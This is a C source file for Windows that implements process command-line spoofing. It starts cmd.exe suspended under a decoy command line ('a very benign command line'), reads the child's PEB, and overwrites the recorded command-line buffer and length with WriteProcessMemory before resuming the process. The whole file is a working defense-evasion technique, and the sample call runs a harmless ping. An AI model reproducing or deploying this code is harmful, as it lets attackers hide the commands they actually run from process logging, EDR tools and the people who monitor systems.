#include "Windows.h"
#include "winternl.h"
#include "stdio.h"

PPEB getPebOfProcess(LPVOID pNtQueryInformationProcess, IN HANDLE hProcess) {
	NTSTATUS(*NtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG) = (NTSTATUS(*)(HANDLE, DWORD, PVOID, ULONG, PULONG))pNtQueryInformationProcess;
	const SIZE_T processBasicInformationSize = sizeof(PROCESS_BASIC_INFORMATION);
	PROCESS_BASIC_INFORMATION processBasicInformation;
	ULONG processBasicInformationSizeWritten = 0;
	NtQueryInformationProcess(hProcess, ProcessBasicInformation, &processBasicInformation, processBasicInformationSize, &processBasicInformationSizeWritten);
	if (processBasicInformationSizeWritten == 0) {
		printf("Failed to invoke NtQueryInformationProcess\n");
		return NULL;
	}
	SIZE_T pebSizeRead = 0;
	PPEB pPeb = VirtualAlloc(NULL, sizeof(PEB), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (pPeb == NULL) {
		printf("Failed to reserve space of PEB\n");
		return NULL;
	}
	ReadProcessMemory(hProcess, processBasicInformation.PebBaseAddress, pPeb, sizeof(PEB), &pebSizeRead);
	if (pebSizeRead == 0) {
		printf("Failed to read PEB\n");
		return NULL;
	}
	return pPeb;
}

PRTL_USER_PROCESS_PARAMETERS getPebProcessParameters(HANDLE hProcess, PPEB pPeb) {
	PRTL_USER_PROCESS_PARAMETERS pProcessParameters = VirtualAlloc(NULL, sizeof(RTL_USER_PROCESS_PARAMETERS), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (pProcessParameters == NULL) {
		printf("Failed to reserve space for process parameters\n");
		return NULL;
	}
	SIZE_T userProcessParametersSizeRead = 0;
	ReadProcessMemory(hProcess, pPeb->ProcessParameters, pProcessParameters, sizeof(RTL_USER_PROCESS_PARAMETERS), &userProcessParametersSizeRead);
	if (userProcessParametersSizeRead == 0) {
		printf("Failed to read user process information\n");
		VirtualFree(pProcessParameters, 0, MEM_RELEASE);
		return NULL;
	}
	return pProcessParameters;
}

void spoofProcessCommandLine(LPCWSTR imagePath, LPCWSTR commandLineActual, LPCWSTR commandLineSpoofed) {
	// TODO: Get system32 directory
	WCHAR system32dir[200] = L"C:\\Windows\\System32";

	// Get NtQueryInformationProcess function pointer
	HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
	if (hNtdll == NULL) {
		printf("Failed to get handle to ntdll.dll\n");
		return;
	}
	LPVOID pNtQueryInformationProcess = GetProcAddress(hNtdll, "NtQueryInformationProcess");
	if (pNtQueryInformationProcess == NULL) {
		printf("Failed to get pointer to NtQueryInformationProcess\n");
		return;
	}

	// Create new process in suspended mode
	PROCESS_INFORMATION newProcessInformation;
	STARTUPINFOW newProcessStartupInfo = { .cb = sizeof(STARTUPINFOW) };
	if (!CreateProcessW(imagePath, commandLineSpoofed, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, system32dir, &newProcessStartupInfo, &newProcessInformation)) {
		printf("Failed to create new process\n");
		return;
	}
	printf("Created new process; PID: %d\n", newProcessInformation.dwProcessId);

	// Get PEB of new process
	PPEB pPeb = getPebOfProcess(pNtQueryInformationProcess, newProcessInformation.hProcess);
	if (pPeb == NULL) {
		printf("Failed to get PEB of new process\n");
		CloseHandle(newProcessInformation.hThread);
		CloseHandle(newProcessInformation.hProcess);
		return;
	}

	// Get PEB process args
	PRTL_USER_PROCESS_PARAMETERS pProcessParameters = getPebProcessParameters(newProcessInformation.hProcess, pPeb);
	if (pProcessParameters == NULL) {
		printf("Failed to get process parameters from PEB\n");
		CloseHandle(newProcessInformation.hThread);
		CloseHandle(newProcessInformation.hProcess);
		return;
	}

	// Patch commandline
	SIZE_T patchSize = 0;

	WriteProcessMemory(newProcessInformation.hProcess, pProcessParameters->CommandLine.Buffer, commandLineActual, (lstrlenW(commandLineActual) * 2) + 2, &patchSize);
	if (patchSize == 0) {
		printf("Failed to patch commandline in PEB\n");
		CloseHandle(newProcessInformation.hThread);
		CloseHandle(newProcessInformation.hProcess);
		return;
	}

	printf("Patched process commandline buffer at %p\n", pProcessParameters->CommandLine.Buffer);

	// Patch commandline length
	DWORD commandLineSizeToWrite = 0;
	patchSize = 0;
	LPVOID commandLineSizePatchAt = (PBYTE)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length);

	WriteProcessMemory(newProcessInformation.hProcess, commandLineSizePatchAt, &commandLineSizeToWrite, sizeof(DWORD), &patchSize);
	if (patchSize == 0) {
		printf("Failed to patch commandline length in PEB\n");
		CloseHandle(newProcessInformation.hThread);
		CloseHandle(newProcessInformation.hProcess);
		return;
	}

	printf("Patched process commandline length at %p\n", commandLineSizePatchAt);
	
	// Resume process
	ResumeThread(newProcessInformation.hThread);

	// Cleanup
	CloseHandle(newProcessInformation.hThread);
	CloseHandle(newProcessInformation.hProcess);
	VirtualFree(pPeb, 0, MEM_RELEASE);
	VirtualFree(pProcessParameters, 0, MEM_RELEASE);
}


void main() {
	spoofProcessCommandLine(L"C:\\Windows\\System32\\cmd.exe", L"/k \"ping google.com\"", L"a very benign command line");
}
